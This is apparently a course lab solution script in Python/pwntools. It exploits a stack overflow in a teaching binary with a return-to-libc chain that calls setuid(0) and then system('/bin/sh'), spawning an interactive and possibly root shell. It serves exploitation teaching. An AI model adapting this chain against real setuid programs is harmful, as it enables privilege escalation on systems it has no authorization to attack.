#!/usr/bin/env python3
"""Solution for Problem 2 (chain): setuid(0) then system("/bin/sh").

Two libc calls in a row need the first argument cleaned up before the second
runs (ESP lifting, slides 22-28). A one-argument cleanup uses a `pop; ret`:

    [ &setuid ][ pop;ret ][ 0 ][ &system ][ &exit ][ &"/bin/sh" ]

main ret -> setuid(0); setuid ret -> pop;ret drops the 0; ret -> system("/bin/sh").
As a normal user setuid(0) returns -1 and you get a non-root shell; the README
shows the setuid-root variant that pops a real root shell.

Run:  cd example5 && make && python3 solution5/solve_chain.py
"""
import os
from pwn import *

context.update(arch="i386", os="linux", log_level="info")

HERE = os.path.dirname(os.path.abspath(__file__))


def runnable(path):
    """/vagrant vboxsf flakily drops the +x bit; always run from an ext4 copy."""
    import shutil, tempfile
    dst = os.path.join(tempfile.mkdtemp(), os.path.basename(path))
    shutil.copy(path, dst)
    os.chmod(dst, 0o755)
    return dst


BIN = runnable(os.path.join(HERE, "..", "chain"))
elf = ELF(BIN, checksec=False)


def loaded_libc(io):
    for path, base in io.libs().items():
        if "libc.so" in path:
            e = ELF(path, checksec=False)
            e.address = base
            return e
    raise RuntimeError("libc not found in process maps")


def find_offset():
    io = process(BIN)
    io.sendline(cyclic(200))
    io.wait()
    off = cyclic_find(io.corefile.eip)
    io.close()
    log.success("offset = %d", off)
    return off


def find_pop_ret(e):
    """Address of any 'pop <reg>; ret' gadget (ESP lifting)."""
    for reg in ("ebx", "ecx", "edx", "esi", "edi", "ebp", "eax"):
        for addr in e.search(asm("pop %s; ret" % reg), executable=True):
            return addr
    raise RuntimeError("no pop;ret gadget found")


def main():
    offset = find_offset()

    io = process(BIN)
    io.recvuntil(b"chain me:\n")             # prompt => libc is mapped
    libc = loaded_libc(io)

    # A "pop <reg>; ret" gadget to lift ESP past setuid's argument. The slides
    # take it from libc (slide 22); libc always has one.
    pop_ret = find_pop_ret(libc)
    log.info("pop;ret gadget @ %#x", pop_ret)

    setuid = libc.symbols["setuid"]
    system = libc.symbols["system"]
    exit_ = libc.symbols["exit"]
    binsh = next(libc.search(b"/bin/sh\x00"))

    payload = flat(
        b"A" * offset,
        setuid, pop_ret, 0,          # setuid(0), then pop the 0
        system, exit_, binsh,        # system("/bin/sh")
    )
    io.sendline(payload)
    log.success("chained setuid(0) -> system(\"/bin/sh\")")
    io.sendline(b"id; echo PWNED")
    io.interactive()


if __name__ == "__main__":
    main()
